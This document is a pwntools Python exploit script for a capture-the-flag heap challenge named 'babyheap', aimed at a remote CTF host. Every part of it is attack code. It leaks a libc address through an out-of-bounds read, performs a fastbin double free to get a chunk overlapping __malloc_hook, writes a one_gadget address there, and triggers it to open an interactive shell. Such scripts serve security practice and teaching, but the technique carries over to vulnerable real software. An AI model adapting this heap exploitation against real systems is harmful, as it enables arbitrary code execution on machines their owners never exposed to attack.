#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./babyheap")
p = remote("ctf.j0n9hyun.xyz", 3030)
elf = ELF("./babyheap")
libc = ELF("./libc.so.6")

def malloc(size, content):
    p.sendafter("> ", '1')
    p.sendlineafter("size: ", str(size))
    p.sendafter("content: ", content)

def free(index):
    p.sendafter("> ", '2')
    p.sendlineafter("index: ", str(index))

def show(index):
    p.sendafter("> ", '3')
    p.sendlineafter("index: ", str(index))

ptr_addr = 0x602060
rel_addr = 0x400590

show((rel_addr - ptr_addr)/8)

addr = u64(p.recvline()[:6] + "\x00\x00")

libcBase = addr - 0x844f0
main_arena_88 = libcBase + 0x3c4b78
one_gadget = libcBase + 0xf02a4
malloc_hook = main_arena_88-88-16
log.info("addr : "+hex(addr))
log.info("libcBase : "+hex(libcBase))
log.info("main_arena_88 : "+hex(main_arena_88))

malloc(0x60, 'B'*0x10)
malloc(0x60, 'C'*0x10)

free(0)
free(1)
free(0)

#gdb.attach(p)

malloc(0x60, p64(malloc_hook-35))
malloc(0x60, 'D'*0x10)
malloc(0x60, 'E'*0x10)
malloc(0x60, 'A'*(35-16)+p64(one_gadget))

free(2)
free(2)

p.interactive()
